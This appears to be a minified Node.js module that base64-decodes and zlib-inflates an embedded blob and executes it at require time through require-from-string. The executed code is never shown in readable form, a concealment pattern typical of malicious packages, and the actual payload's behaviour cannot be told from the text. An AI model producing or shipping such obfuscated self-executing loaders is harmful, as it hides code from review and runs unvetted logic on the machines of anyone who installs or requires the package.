!function(){!function(e){let r=void 0;for(let t=0;t<e.length;t++)try{r=require(e[t]);break}catch(e){}}(["fs-extra","fs"]);const e=t("zlib","decompress");if(!e)return void(module.exports=void 0);const r=t("require-from-string","run");if(!r)return void(module.exports=void 0);function t(e,r){try{return require(e)}catch(t){console.error(__dirname,"requires the",e,"module to be installed so it can",r,"itself")}}let o="eJx9jt0KwjAMhV+l9KqFIm5elj3MaKMMaiJdKoL03Rc3Zfi325xzvi+BcGRF3bFg4IHQ2HuCx+FKQ1R7n4FLRhWkRgl2iU5GM8jkoBL1EaK27m39q5l71LY6qsY6/lTxSxXmV7Cj/9J2lfK2tF2kTtLqWMT+u9OstDPFIhncLpR53EY3TzQL2k9tQG8J",i=__filename;o=function(r){if(r)try{compressed=Buffer.from(r,"base64");let t=e.inflateSync(compressed);return t=t.toString(),t&&""!==t.trim()?t:null}catch(e){return null}}(o),o?module.exports=r(o,i):console.error(i,"failed to decompress")}();